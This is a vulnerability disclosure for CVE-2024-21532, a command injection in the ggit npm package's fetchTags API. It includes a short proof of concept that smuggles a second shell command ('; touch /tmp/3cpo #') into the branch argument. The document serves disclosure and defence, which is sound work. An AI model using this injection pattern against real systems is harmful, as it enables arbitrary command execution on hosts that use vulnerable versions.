# CVE-2024-21532 Command Injection vulnerability in ggit

`ggit` describes itself as:

```
Local promise-returning git command wrappers
```

Resources: 
 * Project's GitHub source code: https://github.com/bahmutov/ggit
 * Project's npm package: https://www.npmjs.com/package/ggit

Article write-up on this vulnerability: https://nodejs-security.com/blog/flawed-git-promises-library-on-npm-leads-to-command-injection-vulnerability

## Background on exploitation

I'm reporting a Command Injection vulnerability in `ggit` npm package.

This vulnerability manifests with the library's `fetchTags(branch)` API,
which allows user input to specify the branch to be fetched and then concatenates
this string along with a git command which is then passed to the unsafe `exec()`
Node.js child process API.

## Exploit

1. Install `ggit@2.4.12` or earlier
2. Establish the following POC:

```js
const fetchTags = require("ggit").fetchTags;
fetchTags("; touch /tmp/3cpo #").then(function () {
  // should be same as running command
  // git pull origin --tags
  console.log("done");
});
```

3. Observe new file created on disk at `/tmp/3cpo`

# Author

Liran Tal
